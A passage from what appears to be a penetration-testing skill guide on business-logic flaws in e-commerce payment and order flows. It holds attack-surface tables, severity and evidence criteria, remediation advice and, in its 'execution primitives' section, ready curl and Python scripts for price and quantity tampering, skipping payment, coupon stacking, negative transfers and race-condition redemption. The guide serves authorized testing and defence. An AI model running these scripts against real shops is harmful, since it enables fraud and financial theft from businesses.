| **Q3** | Does the flow move **scare resource** (quota, claim, redeem, upload, trial)? | Limit-overrun class. Race the claim, then repeat it sequentially. | Go to Q6 |
| **Q4** | Can two requests reach the same value **concurrently**? | Race the pair. The single-packet/group-send technique. | Sequential state-machine testing still applies |
| **Q5** | Does the **server trust a client-supplied field** for the value (amount, status, price, role)? | Tamper it directly. Then tamper its *existence* — delete the field. | The value is server-derived; attack the derivation and rounding instead |
| **Q6** | Is this flow reachable **without authentication**? | Check authorization on **each** step, not just the entry point. | Check horizontal boundaries between same-role users |
| **Q7** | Have you **written down the intended rule** from the target's own docs/UI? | You can prove a violation. Now prove impact. | You have a curiosity, not a finding. Find the rule first |

**Q7 is the gate.** A business-logic finding is only a finding against a *documented or
implied rule*. "The API accepted a negative number" is not a finding until you show the
terms of service, the UI copy, or the pricing page that says the number must be positive.
Capture that artefact — it is the whole difference between a report and a rejection.

**When in doubt, prefer the flow where the number you control is denominated in the
target's currency.**

---

## 15. THE PAYMENT / ORDER ATTACK SURFACE

A consolidated view of the money-moving surface. Each row is an input you control and a
question you must answer.

| Input you control | Where it hides | The question to answer |
|---|---|---|
| unit price | `price`, `unit_price`, `skuPrice`, `amount` | Is the price re-derived server-side from the SKU, or trusted from the cart? |
| quantity | `qty`, `skuQty`, `FoodNum`, `num` | Integer-only? Negative? Zero? Fractional? Overflowing? |
| discount | `discount`, `coupon_id`, `promo`, `voucher` | Applied once? Stackable? Applicable to the shipping line? |
| shipping | `shipping_fee`, `freight`, `postage` | Can it be negative? Can it be zeroed after a valid quote? |
| tax | `tax`, `vat`, `duty` | Recalculated on the tampered subtotal, or on the original? |
| `return_url` / `callback_url` | checkout payload | Validated against an allowlist or used verbatim? |
| currency | `currency`, `currency_code` | Re-rated server-side, or does the numeric value carry over? |
| gateway | `pay_type`, `channel`, `provider` | Can a strong gateway be swapped for a weak/QA one? |
| receiver / merchant | `merchant_id`, `receiver_account`, `payee` | Derived from the session, or from the body? |
| status flags | `status`, `payment_status`, `paid`, `success` | Server-set, or client-set? |
| the field's **absence** | delete `prizeIdList`, `sign`, `coupon_id` | Does "absent" default to the most permissive branch? |

### 15.1 The three-pass method

```
PASS 1 — THINK LIKE A USER
  Complete the flow correctly. Record every request. Establish the baseline total.

PASS 2 — THINK LIKE A CHEATER
  For every captured request, change exactly ONE value to:
    the negative, the zero, the fractional, the boundary, the other currency.
  Send it. Note which pass validation and which change the final total.

PASS 3 — THINK LIKE AN ENGINEER WHO SKIPPED THE REVIEW
  Delete each required field, in turn.
  Reorder the steps. Call step 4 before step 3.
  Send the same request twice, then twenty times in parallel.
  Swap your session's identifiers for their neighbours' (see the IDOR skill:
  [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md)).
```

### 15.2 The 30-minute order of operations

1. **Find the final total in the response.** Everything you do is measured against it.
2. **Send `quantity: -1`.** If the total goes negative, you are done — quantify it and stop.
3. **Send `quantity: 0.02`.** If the total drops to 2%, you are done.
4. **Delete one required field** — try `coupon_id`, `sign`, `prizeIdList`, `payment_method`.
5. **Duplicate the completion request** with the same idempotency key.
6. **Fire 20 parallel completions** and check for multiple fulfilments of one payment.
7. **Only then** move to the more exotic surfaces (currency re-rating, callback forgery).

**Report the projected loss, not just the bug.** "A single request with `quantity: -0.01`
credits ¥5,000 to the attacker's wallet; repeated 100 times per minute it is unbounded" is
the sentence that decides severity.

---

## 16. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Direct financial loss reproduced end-to-end (credit, refund, transfer) | **Critical (P1)** | the request, the resulting balance/ledger, and the projected loss |
| Free goods or services obtained at scale (negative or fractional quantity) | **Critical (P1)** | the order confirmation plus the amount actually charged |
| Payment bypassed entirely (order fulfilled with no charge) | **Critical (P1)** | the fulfilled order and the absence of a payment record |
| Race condition producing a real double-spend with economic loss | **Critical (P1)** | all parallel responses plus the resulting state |
| Vertical privilege escalation through a logic gap | **Critical (P1)** | the privileged action performed as a low-privilege identity |
| Account takeover via a reset/verification logic flaw | **Critical (P1)** | the victim account accessed; state that the account was yours or authorized |
| Unauthorized access to another user's data (horizontal) | **High (P2)** | the victim's object read as a different same-role identity |
| Coupon/referral abuse with a bounded but real credit gain | **High (P2)** | the credits obtained and their conversion path |
| Business rule violation with no direct loss (e.g. trial extended) | **Medium (P3)** | the rule from the target's own documentation, plus the violating request |
| A quota or limit exceeded with no material consequence | **Low (P4)** | the over-limit state |
| A client-side-only control bypassed with no server effect | **Informational (P5)** | the client control and the server's non-response |
| A missing validation with no exploitable path demonstrated | **Not a finding** | state what access would be needed to prove impact |
| A race that fires but leaves the final state correct | **Not a finding** | the invariant held |

**Severity follows the money and the privilege, in that order.** A logic flaw that cannot be
turned into either is a hygiene issue — report it, but never as high.

**Never inflate the loss estimate.** If you obtained ¥0.01 of credit, report ¥0.01 and state
the extrapolation as a separate, clearly-labelled projection.

---

## 17. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the **intended** rule, quoted from the target's own docs, UI, or terms | without it there is no violation to prove |
| the full request — method, path, headers, body — for every step of the flow | a business-logic bug is a sequence, not a request |
| the response for each step, including the final total or state | the artefact that changed |
| the exact field, value, and delta you introduced | reproducibility |
| before/after account state (balance, order status, credit, VIP expiry) | **proves the impact, not just the acceptance** |
| the projection with its arithmetic shown separately | converts one hit into a severity |
| for races: all parallel responses plus the resulting state | the group is the evidence, not one response |
| for multi-step bypasses: proof the skipped step was never performed | rules out a hidden server-side check |
| a **negative control**: the same request with a *legitimate* value | proves you changed the outcome, not the endpoint's behaviour |
| confirmation that only your own accounts and funds were used | shows the test was contained |

**The before/after state is the finding.** A `200` on a tampered request proves the
validation is absent; it does not prove a loss. Show the balance move.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| the UI showed the manipulated price, the server charged correctly | server-side re-derivation worked — check the final total, not the screen |
| a coupon "stacked" but the second was silently ignored | read the server's total, not the client's |
| the negative quantity returned 200 with an error body | read the body, not the status |
| the order was created but never fulfilled and never charged | no impact |
| the "free" order is pending manual review | state it as PLAUSIBLE, not CONFIRMED |
| the discount applied to your own test account in a staging tenant | wrong environment |
| the skipped step turned out to be validated later, at fulfilment | the check was deferred, not missing |
| two parallel requests both returned 200 but the ledger is correct | idempotency held |

---

## 18. REMEDIATION REFERENCE

1. **Derive every monetary value server-side** — price, tax, shipping, and total from the SKU and the account, never from the request. The client supplies *what* is being bought, never *how much* it costs.
2. **Type and range every numeric field at the boundary** — integers for quantities, decimals for money, explicit `min`/`max`, and an explicit rejection of `null`, `""`, arrays, and strings that coerce.
3. **Use integer minor units for all money** — store and compute in cents/mills, never floating point. This eliminates the rounding-arbitrage class outright.
4. **Validate the final total against an independent recomputation** — a second, server-side calculation compared with the request's total; a mismatch is a rejection, not a warning.
5. **Make state transitions explicit and server-enforced** — an allowlisted transition table per resource type; reject any transition the state machine does not define.
6. **Make every state-changing endpoint idempotent** — a client-supplied idempotency key, stored with the result, returned on repeat. Apply to payment, refund, redemption, and claim.
7. **Make the check and the write atomic** — a single conditional update, unique constraints, or a transaction with the correct isolation level. Never read-then-write in application code.
8. **Bind identity to the session, never to the body** — `uid`, `email`, `role`, `merchant_id`, and `receiver_account` come from the authenticated session; a body value that contradicts the session is an error.
9. **Treat field absence as a validation failure** — require the field explicitly rather than defaulting an absent field to the permissive branch. This is the `prizeIdList` class of bug.
10. **Re-authorize at every step of a multi-step flow** — never infer that step 4 is authorized from step 3's success. Each step re-derives the actor and re-checks the object.
11. **Enforce server-side what the UI only suggests** — client-side `disabled`, `readonly`, and hidden fields are presentation, never controls.
12. **Test the business rules in CI** — a suite that asserts the invariant (one coupon per order, balance never negative, one fulfilment per payment) after each tampering attempt catches these regressions where unit tests never look.

---

## 19. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is there a **legitimate request** that produces the same outcome the intended way? | the baseline, and the price of the normal path |
| 2 | Does the **manipulated request** produce the outcome for materially less? | the logic defect |
| 3 | Did the **order, count, or state actually change** on an independent read? | the effect, not a response code |
| 4 | Is the same manipulation **repeatable** across three runs? | it is a control gap, not a race or a fluke |
| 5 | Is the outcome **outside the business rules** the app itself documents or enforces elsewhere? | the rule violated, named |
| 6 | Does the flaw require an **unusual but permitted** state (an empty cart, a pending order, a zero quantity)? | the precondition, for the fix |
| 7 | What is the **quantified loss** per unit and per hour, if the defect is unbounded? | impact, expressed in the client's own units |

**The normal-path control is the bar.** A price you can influence proves nothing until the same item
is shown to cost more through the intended flow, and the difference is measured.

---

## 20. EXECUTION PRIMITIVES

Business logic is proven by **a normal-path control and a manipulated path that differ in the
client's favour, repeatably, with the resulting state read back**. Numbers in the response are not
the evidence; the persisted state is.

### 20.1 The normal-path control, priced

```bash
T="https://target.tld"
S="session=PASTE"
# the intended flow, end to end, with every value recorded
curl -sS -o /tmp/n1 "$T/api/cart" -H "Cookie: $S" | head -c 300; echo
curl -sS -o /tmp/n2 -w 'add    %{http_code}\n' -X POST "$T/api/cart/items" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"sku":"ITEM-1","qty":1}'
curl -sS -o /tmp/n3 "$T/api/cart" -H "Cookie: $S"
python3 -c "
import json;d=json.load(open('/tmp/n3'))
print('normal total:',d.get('total'),'| lines:',[(i.get('sku'),i.get('qty'),i.get('price')) for i in d.get('items',[])][:3])"
```

**Capture the legitimate total before touching anything.** Every subsequent claim is a delta against
this number, and it is the control the reader will re-run.

### 20.2 Price and quantity manipulation

```bash
# push back a modified price, a modified quantity, and a negative value, then read the cart
curl -sS -o /tmp/m1 -w 'price-override  %{http_code}\n' -X PATCH "$T/api/cart/items/1" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"price":0.01}'
curl -sS -o /tmp/m2 -w 'negative-qty    %{http_code}\n' -X POST "$T/api/cart/items" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"sku":"ITEM-1","qty":-1}'
curl -sS -o /tmp/m3 -w 'float-qty       %{http_code}\n' -X POST "$T/api/cart/items" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"sku":"ITEM-1","qty":0.0001}'
curl -sS -o /tmp/m4 -w 'huge-qty        %{http_code}\n' -X POST "$T/api/cart/items" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"sku":"ITEM-1","qty":99999999999999999999}'
# read back after each, since the response is not the state
for f in /tmp/m1 /tmp/m2 /tmp/m3 /tmp/m4; do
  curl -sS "$T/api/cart" -H "Cookie: $S" | python3 -c "
import json,sys;d=json.load(sys.stdin);print('$f', d.get('total'), [(i.get('sku'),i.get('qty'),i.get('price')) for i in d.get('items',[])][:3])"
done
```

**Read the cart back after every mutation.** A `200` from the PATCH with `price:0.01` in the request
does not mean the price changed; the cart's own total is what does.

### 20.3 Workflow and step skip

```bash
# enumerate the steps, then attempt each out of order
for STEP in /api/checkout/address /api/checkout/shipping /api/checkout/payment /api/checkout/confirm /api/checkout/complete; do
  R=$(curl -sS -o /tmp/w -w '%{http_code} %{size_download}' -X POST "$T$STEP" -H "Cookie: $S" \
        -H 'Content-Type: application/json' -d '{}')
  printf '%-34s %s\n' "$STEP" "$R"
done
# the decisive test: complete the order without ever calling the payment step
curl -sS -o /tmp/w2 -w 'skip-payment %{http_code}\n' -X POST "$T/api/checkout/complete" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"paymentMethod":null}'
curl -sS -o /tmp/orders "$T/api/orders" -H "Cookie: $S"
grep -oE '"status":"[a-z]+"' /tmp/orders | sort | uniq -c
```

**An order reaching `paid` or `fulfilled` without the payment step is the finding**, and the order
list read back is the proof. Skipping a step that has no consequence is not.

### 20.4 Coupon, referral and credit abuse

```bash
# the same coupon applied repeatedly, and the stacking rule tested
curl -sS -o /tmp/c1 -w 'apply-1 %{http_code}\n' -X POST "$T/api/coupon" -H "Cookie: $S" -H 'Content-Type: application/json' -d '{"code":"SAVE10"}'
for i in 2 3 4 5; do
  curl -sS -o /tmp/c$i -w "apply-$i %{http_code}\n" -X POST "$T/api/coupon" -H "Cookie: $S" -H 'Content-Type: application/json' -d '{"code":"SAVE10"}'
done
curl -sS "$T/api/cart" -H "Cookie: $S" | python3 -c "import json,sys;d=json.load(sys.stdin);print('total after N applies:',d.get('total'))"
# and the case-variant and whitespace forms, which are the usual stacking bug
for C in 'save10' 'SAVE10 ' ' SAVE10' 'SAVE10\n' 'SAVE-10'; do
  R=$(curl -sS -o /dev/null -w '%{http_code}' -X POST "$T/api/coupon" -H "Cookie: $S" -H 'Content-Type: application/json' -d "{\"code\":\"$C\"}")
  printf '%-10s %s\n' "$C" "$R"
done
```

**The total after the second application is the evidence.** A coupon accepted twice is not a finding
until the cart total reflects both.

### 20.5 Numeric and type boundaries

```bash
# the values that break arithmetic: negatives, zero, overflow, floats, and strings
for Q in '-1' '0' '0.0' '1e10' '9999999999999999999999' 'NaN' 'Infinity' 'null' '"1"' '1e-10' ; do
  R=$(curl -sS -o /tmp/nb -w '%{http_code}' -X POST "$T/api/cart/items" -H "Cookie: $S" \
        -H 'Content-Type: application/json' -d "{\"sku\":\"ITEM-1\",\"qty\":$Q}")
  TOT=$(curl -sS "$T/api/cart" -H "Cookie: $S" | grep -oE '"total":[^,}]+' | head -1)
  printf '%-26s %s %s\n' "$Q" "$R" "$TOT"
done
# and the boundary on a transfer or a refund, where a negative has real meaning
curl -sS -o /tmp/tf -w 'negative-transfer %{http_code}\n' -X POST "$T/api/transfer" -H "Cookie: $S" \
  -H 'Content-Type: application/json' -d '{"to":"YOUR_ACCOUNT","amount":-100}'
curl -sS "$T/api/balance" -H "Cookie: $S"
```

A negative quantity that **increases your credit** is the classic: it is the arithmetic defect, and
the balance read-back is what proves it. Test zero and negative separately, since they fail differently.

### 20.6 Race conditions, measured

```bash
# the single-request baseline, then the same operation sent in parallel
before=$(curl -sS "$T/api/balance" -H "Cookie: $S" | grep -oE '[0-9.]+' | head -1)
for N in 2 5 10 20; do
  seq $N | xargs -P $N -I{} curl -sS -o /dev/null -w '' -X POST "$T/api/redeem" \
    -H "Cookie: $S" -H 'Content-Type: application/json' -d '{"code":"ONCE"}'
  after=$(curl -sS "$T/api/balance" -H "Cookie: $S" | grep -oE '[0-9.]+' | head -1)
  printf 'parallel=%-3s delta=%s\n' "$N" "$(python3 -c "print(float('$after')-float('$before'))")"
  before=$after
done
# the control: the same N operations sent sequentially must be limited to one
```

**The control is a sequential run of the same count.** If ten sequential requests redeem once and ten
parallel requests redeem ten times, that difference is the race condition, and it is measured rather
than asserted.

### 20.7 Subscription and tier confusion

```bash
# what does the tier actually gate, and what happens if the tier value comes from the client?
for TIER in free basic pro enterprise "" null 0 999 ; do
  R=$(curl -sS -o /tmp/ti -w '%{http_code}' -X POST "$T/api/subscribe" -H "Cookie: $S" \
        -H 'Content-Type: application/json' -d "{\"plan\":\"$TIER\"}")
  printf '%-12s %s\n' "$TIER" "$R"
done
# and the feature that should be gated, accessed on the cheapest tier
curl -sS -o /tmp/ft -w 'gated-feature %{http_code} %{size_download}\n' "$T/api/analytics/advanced" -H "Cookie: $S"
head -c 200 /tmp/ft; echo
```

**The gated feature returning data on the cheapest plan is the proof.** The plan field being accepted
from the client is only a finding once a feature is actually unlocked.

### 20.8 A harness that carries the control alongside each probe

```bash
python3 - <<'PY'
import json,urllib.request,urllib.parse,copy
T="https://target.tld"; S="session=PASTE"
def call(method,path,body=None):
    h={"Cookie":S}
    data=None
    if body is not None: h["Content-Type"]="application/json"; data=json.dumps(body).encode()
    r=urllib.request.Request(T+path,data,h,method=method)
    try:
        x=urllib.request.urlopen(r,timeout=15); return x.status,x.read().decode(errors="ignore")
    except urllib.error.HTTPError as e: return e.code,e.read().decode(errors="ignore")
def total():
    _,b=call("GET","/api/cart")
    try: return json.loads(b).get("total")
    except Exception: return None

_,_=call("POST","/api/cart/items",{"sku":"ITEM-1","qty":1})
control=total(); print("control total:",control)
for name,body in [("price-0.01",{"price":0.01}),("qty-negative",{"qty":-1}),("qty-float",{"qty":0.0001})]:
    call("PATCH","/api/cart/items/1",body)
    t=total()
    print(f"{name:14} total={t} decreased={isinstance(t,(int,float)) and isinstance(control,(int,float)) and t<control}")
print()
print("report only the rows where decreased=True, each with the control total and the manipulated total")
PY
```

**Every probe is paired with the control total.** A business-logic report that shows only the
manipulated outcome, without the price of the honest path, is not evidence of anything.

---

## 21. RELATED SIBLINGS - LOAD TOGETHER

- [race-condition](../race-condition/SKILL.md) - the timing form of the same logic defect
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the object-level half of most logic findings
- [type-juggling](../type-juggling/SKILL.md) - the comparison defects that make numeric manipulation work
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parameter form that flips a decision
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the sibling that reaches the same objects
